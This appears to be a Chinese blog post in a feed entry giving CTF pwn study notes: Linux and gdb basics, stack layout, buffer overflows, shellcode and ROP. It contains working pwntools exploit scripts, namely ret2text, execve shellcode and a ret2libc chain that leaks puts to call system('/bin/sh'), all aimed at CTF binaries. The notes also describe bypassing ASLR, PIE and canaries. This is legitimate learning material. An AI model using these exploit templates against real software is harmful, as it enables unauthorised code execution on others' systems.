    <content type="html"><![CDATA[<p>先存个档。</p><span id="more"></span><h1 id="1-Linux入门"><a href="#1-Linux入门" class="headerlink" title="1. Linux入门"></a>1. Linux入门</h1><div class="table-container"><table><thead><tr><th>命令</th><th>含义</th><th>示例</th></tr></thead><tbody><tr><td>pwd</td><td>输出当前路径</td><td>pwd</td></tr><tr><td>ls</td><td>列出位于当前路径的文件</td><td>ls -al</td></tr><tr><td>cd xxx</td><td>改变当前路径，前往xxx目录</td><td>cd ~/workspace</td></tr><tr><td>cat xxx</td><td>直接展示xxx文件的内容</td><td>cat hw.c</td></tr><tr><td><em>*</em> \</td><td>grep xxx</td><td><em>*</em>是其他命令，输出含有xxx的行</td><td>cat hw.c \</td><td>grep stdio.h</td></tr><tr><td><em>*</em> \</td><td>less</td><td>查看输出更舒服，jk上下移动q退出</td><td>cat hw.c \</td><td>less</td></tr><tr><td>./xxx</td><td>运行当前目录xxx可执行文件</td><td>./a.out</td></tr></tbody></table></div><h1 id="2-汇编基础"><a href="#2-汇编基础" class="headerlink" title="2. 汇编基础"></a>2. 汇编基础</h1><p> 内存地址：在有段/偏移寄存器的语境下一般记为<code>段:偏移</code>，如<code>CS:IP</code>,<code>SS:IP</code>,<code>SS:BP</code>,<code>DS:DI</code>,<code>DS:SI</code>,<code>DS:[]</code></p><script type="math/tex; mode=display">一个内存地址=段地址×16+偏移地址\\1234h:ABCDh=12340h+ABCDh=1CF0Dh</script><p>小端序：低地址存放低位数据</p><p>一个程序的内存空间：</p><div class="table-container"><table><thead><tr><th>高地址</th><th style="text-align:center">OS Kernel Space</th></tr></thead><tbody><tr><td></td><td style="text-align:center">Stack</td></tr><tr><td></td><td style="text-align:center">↓(blank)</td></tr><tr><td></td><td style="text-align:center">Shared Libraries</td></tr><tr><td></td><td style="text-align:center">↑(blank)</td></tr><tr><td></td><td style="text-align:center">Heap</td></tr><tr><td></td><td style="text-align:center">BSS</td></tr><tr><td></td><td style="text-align:center">Data(RW)数据段</td></tr><tr><td></td><td style="text-align:center">Text(RX)代码段</td></tr><tr><td>低地址</td><td style="text-align:center">(blank)</td></tr></tbody></table></div><p>栈：</p><div class="table-container"><table><thead><tr><th style="text-align:center">SS:SP 栈顶</th></tr></thead><tbody><tr><td style="text-align:center">SS:BP 栈帧基底</td></tr><tr><td style="text-align:center">SS 栈底</td></tr></tbody></table></div><p>寄存器总结</p><div class="table-container"><table><thead><tr><th>name</th><th>用途</th><th>name</th><th>用途</th></tr></thead><tbody><tr><td>AX</td><td>通常用来存放函数的返回值</td><td>SS(Stack Seg)</td><td>栈的段地址/基地址</td></tr><tr><td>CX</td><td>通常用来做循环计数器</td><td>CS(Code Seg)</td><td>下一条指令的段地址</td></tr><tr><td>BX</td><td></td><td>DS(Data Seg)</td><td>数据的段地址</td></tr><tr><td>DX</td><td></td><td><strong>SP(Stack Pointer)</strong></td><td>栈顶偏移地址</td></tr><tr><td></td><td></td><td><strong>BP(Base Pointer)</strong></td><td>栈的基址偏移地址</td></tr><tr><td></td><td></td><td><strong>IP(Instruction Pointer)</strong></td><td>下一条指令的偏移地址</td></tr></tbody></table></div><p>汇编指令</p><p><img src="F:\markdown图片\pwn知识点\汇编指令.png" alt="汇编指令"></p><h1 id="3-程序装载与栈帧结构"><a href="#3-程序装载与栈帧结构" class="headerlink" title="3. 程序装载与栈帧结构"></a>3. 程序装载与栈帧结构</h1><p>在Linux的可执行文件ELF</p><p>ELF文件类型：</p><ul><li>Relocatable File(*.o)：可重定位文件，用来链接的素材</li><li>Executable File(*)：可执行文件</li><li>Shared Object File(*.so)：共享目标文件，用于做动态链接库</li></ul><h1 id="4-实战环境配置和工具介绍"><a href="#4-实战环境配置和工具介绍" class="headerlink" title="4. 实战环境配置和工具介绍"></a>4. 实战环境配置和工具介绍</h1><p>连接远程服务器：</p><p>nc表示netcat</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc node4.buuoj.cn 28487</span><br></pre></td></tr></table></figure><p>使用file查看文件信息，checksec查看文件保护信息。</p><img src="/posts/1c971db4/checksec.png" class="" title="文件信息"><p>利用gdb调试ELF文件：</p><div class="table-container"><table><thead><tr><th>命令</th><th>简写</th><th>说明</th></tr></thead><tbody><tr><td>file</td><td></td><td>装载一个文件，可以在gdb后加参数，效果等同</td></tr><tr><td>kill</td><td></td><td>终止当前调试的进程</td></tr><tr><td>run</td><td>r</td><td>运行当前装载的文件，运行过程中使用Ctrl + C退出程序交互，进入调试(在退出时位置)</td></tr><tr><td>next</td><td>n</td><td>=step over 单步步过</td></tr><tr><td>step</td><td>s</td><td>=step into 单步步入</td></tr><tr><td>continue</td><td>c</td><td>继续执行程序，直到下一个中断或程序结束</td></tr><tr><td>finish</td><td>fini</td><td>运行到函数返回处</td></tr><tr><td>catch</td><td></td><td>设置捕捉点</td></tr><tr><td>thread</td><td>t</td><td>查看当前程序的线程信息</td></tr><tr><td>break</td><td>b</td><td>在当前位置设置断点</td></tr><tr><td>backtrace</td><td>k</td><td>查看当前函数调用栈信息</td></tr><tr><td>stack</td><td></td><td>stack n 查看栈内容</td></tr><tr><td>vmmap</td><td></td><td>查看程序中的分段，相当于OD中的<code>E</code>模块</td></tr></tbody></table></div><h1 id="5-缓冲区溢出"><a href="#5-缓冲区溢出" class="headerlink" title="5. 缓冲区溢出"></a>5. 缓冲区溢出</h1><p>编写程序时没有考虑或错误设置用户输入长度，导致用户向缓冲区输入长度超过接受变量长度，从而覆盖到其它正常数据，破坏栈帧结构。</p><p>缓冲区溢出常见的漏洞函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">gets</span><span class="params">(<span class="type">char</span> *str)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span> handle, <span class="type">void</span> *buf, <span class="type">int</span> len)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">scanf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">getchar</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *<span class="keyword">restrict</span> format, ...)</span>;</span><br></pre></td></tr></table></figure><p>如果文件中有”/bin/sh”，可用以下脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, bits=<span class="number">64</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;/usr/bin/x-terminal-emulator&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Interface</span></span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line">binary_name = <span class="string">&#x27;filename&#x27;</span></span><br><span class="line">port = <span class="number">12345</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process([<span class="string">&quot;./&quot;</span> + binary_name])</span><br><span class="line">    e = ELF(<span class="string">&#x27;./&#x27;</span> + binary_name)</span><br><span class="line">    <span class="comment"># libc = ELF(&#x27;e.libc&#x27;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;ctf.spaceskynet.top&quot;</span>, port)</span><br><span class="line">    e = ELF(<span class="string">&quot;./&quot;</span> + binary_name)</span><br><span class="line">    <span class="comment"># libc = ELF(&quot;libc-2.23.so&quot;)</span></span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">z</span>(<span class="params">a=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        gdb.attach(p, a)</span><br><span class="line">        <span class="keyword">if</span> a == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            raw_input()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rc = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> delim, data: p.sendlineafter(delim, data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># main</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    z(<span class="string">&#x27;b foo&#x27;</span>)<span class="comment">#在foo函数下断</span></span><br><span class="line">    <span class="comment"># 如果直到backdoor和binsh的地址可直接写地址</span></span><br><span class="line">    <span class="comment"># backdoor = 0x08049172</span></span><br><span class="line">    <span class="comment"># bin_sh = 0x0804A008</span></span><br><span class="line">    backdoor = e.symbols[<span class="string">&#x27;backdoor&#x27;</span>]<span class="comment">#参数为函数名字</span></span><br><span class="line">    bin_sh = <span class="built_in">next</span>(e.search(<span class="string">b&#x27;/bin/sh&#x27;</span>)) <span class="comment">#在ELF文件中找/bin/sh</span></span><br><span class="line">    main_addr = e.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x1c</span> + p32(backdoor) + p32(main_addr) + p32(bin_sh)<span class="comment"># 即执行完backdoor函数后返回到main函数</span></span><br><span class="line">    sl(payload)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure><h1 id="6-Shellcode"><a href="#6-Shellcode" class="headerlink" title="6. Shellcode"></a>6. Shellcode</h1><p>shellcode就是能使程序调用shell的一段代码(通常为汇编级别/机器码)。一旦某种shellcode被执行，我们就能够拿到目标机器的控制权限，从而获取flag。</p><ul><li>system(“/bin/sh”);（？） -&gt; execve(“/bin/sh”, 0, 0)</li><li>触发中断(int 0x80 / syscall)</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">; first.asm</span><br><span class="line">; first get shell test in pwn class</span><br><span class="line">; nasm -f elf32 first.asm</span><br><span class="line">; ld -m elf_i386 -o getShell first.o</span><br><span class="line">; objump -d getShell</span><br><span class="line"></span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">push &quot;/sh&quot;</span><br><span class="line">push &quot;/bin&quot;</span><br><span class="line">mov ebx, esp</span><br><span class="line">xor edx, edx</span><br><span class="line">xor ecx, ecx</span><br><span class="line">mov al, 0xb</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><p>Shellcode脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, bits=<span class="number">64</span>)</span><br><span class="line">    payload1 = asm(shellcraft.sh())</span><br><span class="line">    My_Shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rbx, 0x68732f6e69622f</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor esi, esi</span></span><br><span class="line"><span class="string">    xor edx, edx</span></span><br><span class="line"><span class="string">    push 0x3b</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    payload2 = asm(My_Shellcode)</span><br><span class="line">    p = process(<span class="string">&#x27;./mrctf2020_shellcode&#x27;</span>)</span><br><span class="line">    <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;, 25266)</span></span><br><span class="line">    <span class="comment"># p.sendline(payload1)</span></span><br><span class="line">    p.sendline(payload2)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure><h1 id="7-ROP链构造"><a href="#7-ROP链构造" class="headerlink" title="7. ROP链构造"></a>7. ROP链构造</h1><p>NX——NO Execute bit(禁止执行位)是应用在CPU上的安全技术，它支持了操作系统级别的DEP——Data Execute Prevention(数据执行保护，Microsoft)。在应用了NX的系统上，(如果可执行文件开启保护)，会把内存中的区域分为只供存储指令和只供存储数据两种。NX bit 被标记在内存分页中使用的页表索引上，如果置1，则该页内存数据不允许被执行，即把所有内容作为数据处理。这样可以防范shellcode注入攻击。</p><p>ROP——Return-Oriented Programming(返回导向编程)技术，允许攻击者在开启了栈不可执行等安全保护技术的情况下，执行恶意代码。</p><p>核心思想是通过栈溢出等方式，改写栈上的控制信息(调用栈，即return address, rbp等)，以控制调用栈，劫持程序控制流并执行一些针对性的命令序列(gadgets)。</p><p>gadgets主要指一些以ret结尾的小段汇编指令，它们的执行通过ret语句和栈上控制的返回地址相连，构成一条ROP链。链的功能是设置寄存器值，泄露信息，调用函数等。</p><h2 id="7-1-Ret2Text"><a href="#7-1-Ret2Text" class="headerlink" title="7.1 Ret2Text"></a>7.1 Ret2Text</h2><p>gadget一般存在于Text中，或者广义上存在于ELF文件中(指令部分)。将返回地址改写为能执行某些特定功能的gadget地址，构造ROP链。</p><p>辅助工具：ropper、pwntools(ELF class)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, bits=<span class="number">64</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;/usr/bin/x-terminal-emulator&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Interface</span></span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line">binary_name = <span class="string">&#x27;filename&#x27;</span></span><br><span class="line">port = <span class="number">12345</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process([<span class="string">&quot;./&quot;</span> + binary_name])</span><br><span class="line">    e = ELF(<span class="string">&#x27;./&#x27;</span> + binary_name)</span><br><span class="line">    <span class="comment"># libc = ELF(&#x27;e.libc&#x27;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;ctf.spaceskynet.top&quot;</span>, port)</span><br><span class="line">    e = ELF(<span class="string">&quot;./&quot;</span> + binary_name)</span><br><span class="line">    <span class="comment"># libc = ELF(&quot;libc-2.23.so&quot;)</span></span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">z</span>(<span class="params">a=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        gdb.attach(p, a)</span><br><span class="line">        <span class="keyword">if</span> a == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            raw_input()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rc = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> delim, data: p.sendlineafter(delim, data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># main</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># backdoor = e.plt[&#x27;system&#x27;]</span></span><br><span class="line">    backdoor = e.symbols[<span class="string">&#x27;backdoor&#x27;</span>]<span class="comment">#参数为函数名字</span></span><br><span class="line">    bin_sh = <span class="built_in">next</span>(e.search(<span class="string">b&#x27;/bin/sh&#x27;</span>)) <span class="comment">#在ELF文件中找/bin/sh</span></span><br><span class="line">    poprdi = <span class="number">0x4011eb</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x08</span> + p64(poprdi) + p64(bin_sh) + p64(backdoor)<span class="comment"># 将当前rdi的值扔掉，bin_sh的地址赋给rdi，作为参数调用backdoor中的system</span></span><br><span class="line">    sl(payload)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure><p>如果文件中没有system函数，如果想要调用system函数，要利用到PLT表。</p><h2 id="7-2-Ret2syscall"><a href="#7-2-Ret2syscall" class="headerlink" title="7.2 Ret2syscall"></a>7.2 Ret2syscall</h2><ul><li>一般为静态链接的可执行文件，指令非常多，也提供了许多gadget</li></ul><ul><li>最核心gadget：syscall(int 0x80)</li></ul><ul><li>整体类似Shellcode注入</li></ul><img src="/posts/1c971db4/7.2.1.png" class="" title="静动态链接"><p>静态链接的ELF文件在IDA的函数窗口全是一片白，没有粉色的动态链接。</p><p>利用ROPgadget工具，自行生成ROP链。</p><h2 id="7-3-PLT表和GOT表"><a href="#7-3-PLT表和GOT表" class="headerlink" title="7.3 PLT表和GOT表"></a>7.3 PLT表和GOT表</h2><p><a href="https://blog.csdn.net/qq_52126646/article/details/119494939">GOT表和PLT表</a></p><p>这里的PLT表示<code>.plt</code>，GOT表表示<code>.got.plt</code>。<code>.got</code>存放其它全局符号信息，与<code>.got.plt</code>不同，与<code>.plt</code>关系不大。</p><h2 id="7-4-Ret2libc"><a href="#7-4-Ret2libc" class="headerlink" title="7.4 Ret2libc"></a>7.4 Ret2libc</h2><ul><li>对动态链接文件，一般链接glibc</li></ul><ul><li>glibc链接基址未知，需要进行基址泄露</li></ul><ul><li>一般需要程序循环，可以通过ROP链构造循环</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, bits=<span class="number">64</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;/usr/bin/x-terminal-emulator&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Interface</span></span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line">binary_name = <span class="string">&#x27;filename&#x27;</span></span><br><span class="line">port = <span class="number">12345</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process([<span class="string">&quot;./&quot;</span> + binary_name])</span><br><span class="line">    e = ELF(<span class="string">&#x27;./&#x27;</span> + binary_name)</span><br><span class="line">    <span class="comment"># libc = ELF(&#x27;e.libc&#x27;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;ctf.spaceskynet.top&quot;</span>, port)</span><br><span class="line">    e = ELF(<span class="string">&quot;./&quot;</span> + binary_name)</span><br><span class="line">    <span class="comment"># libc = ELF(&quot;libc-2.23.so&quot;)</span></span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">z</span>(<span class="params">a=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        gdb.attach(p, a)</span><br><span class="line">        <span class="keyword">if</span> a == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            raw_input()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rc = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> delim, data: p.sendlineafter(delim, data)</span><br><span class="line"></span><br><span class="line">prdi = <span class="number">0x400c83</span></span><br><span class="line">penc = <span class="number">0x4009a0</span></span><br><span class="line"><span class="comment"># main</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    z(<span class="string">&#x27;b *0x4009d1\nb *0x400aee&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;choice&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x50</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x08</span> + p64(prdi) + p64(e.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(e.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(penc)<span class="comment"># 泄露puts函数地址</span></span><br><span class="line">    sla(<span class="string">&#x27;encrypted&#x27;</span>, payload)</span><br><span class="line">    </span><br><span class="line">    ru(<span class="string">b&#x27;\x40\x0a&#x27;</span>)</span><br><span class="line">    log.info(<span class="string">&#x27;start detecting libc address&#x27;</span>)</span><br><span class="line">    libc_puts = u64(p.recvuntil(<span class="string">b&#x27;\x0a&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log.success(<span class="string">&#x27;libc puts address found:&#x27;</span> + <span class="built_in">hex</span>(libc_puts))</span><br><span class="line">    libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, libc_puts)</span><br><span class="line">    <span class="comment"># libc.symbols[&#x27;puts&#x27;]</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># libc.select_libc(0)</span></span><br><span class="line">    libc_addr = libc_puts - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    rtn_addr = <span class="number">0x400b27</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x50</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">8</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">        payload += p64(rtn_addr)<span class="comment"># for align</span></span><br><span class="line">    payload += p64(prdi) + p64(libc_addr + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)) + p64(libc_addr + libc.dump(<span class="string">&quot;system&quot;</span>))</span><br><span class="line">    sla(<span class="string">&#x27;encrypted&#x27;</span>, payload)</span><br><span class="line">    </span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure><h1 id="8-ELF保护措施及绕过方法"><a href="#8-ELF保护措施及绕过方法" class="headerlink" title="8. ELF保护措施及绕过方法"></a>8. ELF保护措施及绕过方法</h1><h2 id="8-1-ASLR"><a href="#8-1-ASLR" class="headerlink" title="8.1 ASLR"></a>8.1 ASLR</h2><p>ASLR(Address space layout randomization)——地址空间配置随机化</p><p>将可执行文件、共享库、栈、堆的基址随机化，用于防范明确地址的内存破坏攻击，比如ret2libc、stack address。</p><p>应对方法：地址泄露</p><h2 id="8-2-NX"><a href="#8-2-NX" class="headerlink" title="8.2 NX"></a>8.2 NX</h2><p>看[7.ROP链构造]</p><h2 id="8-3-PIE"><a href="#8-3-PIE" class="headerlink" title="8.3 PIE"></a>8.3 PIE</h2><p>PIE(Position-independent executable)——地址无关代码/可执行文件</p><p>无论文件被加载进内存空间的什么地址中，程序都能够正常运行。在共享库链接中有重要作用。共享库文件被动态链接到内存中，PIE使其能正确处理外部引用。在普通ELF文件上，ELF配合ASLR，使其基址不可预测，增加了攻击难度。</p><p>整个ELF文件都会被装载进一个随机偏移的连续内存空间里，只有基址变成了未知，其它都是相同的。</p><p>应对方法：Partial Writing</p><p>程序的加载以内存页(4K)为单位，基地址后3位(hex)一定为0，同一文件被加载进连续地址中。</p><p>一般利用Return Address控制跳转，可通过栈上已有地址，只修改最低3位(2B，4位)值，控制转向</p><h2 id="8-4-Canary"><a href="#8-4-Canary" class="headerlink" title="8.4 Canary"></a>8.4 Canary</h2><p>Canary(Canary in a coal mine)——金丝雀</p><p>一串随机数据，放置在栈数据和控制信息之间，函数开始时被放入，退出前检验，若被修改立即终止程序，极大地防范了栈溢出攻击。</p><p>应对方法：Canary Leak</p><ul><li>覆盖栈到Canary处，利用puts等函数泄露地址</li><li>Canary最低字节为0，防止连带输出</li></ul><p>小技巧：<code>scanf(&quot;%d&quot;);</code>输入”+”不覆盖内存数据</p><h1 id="9-Stack-Pivot"><a href="#9-Stack-Pivot" class="headerlink" title="9. Stack Pivot"></a>9. Stack Pivot</h1><p>假如可供泄露空间过少，或者需要整段可控的栈空间，这就需要使栈帧移向可控栈空间，控制程序执行流转向。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;先存个档。&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞渗透" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="Pwn" scheme="http://example.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
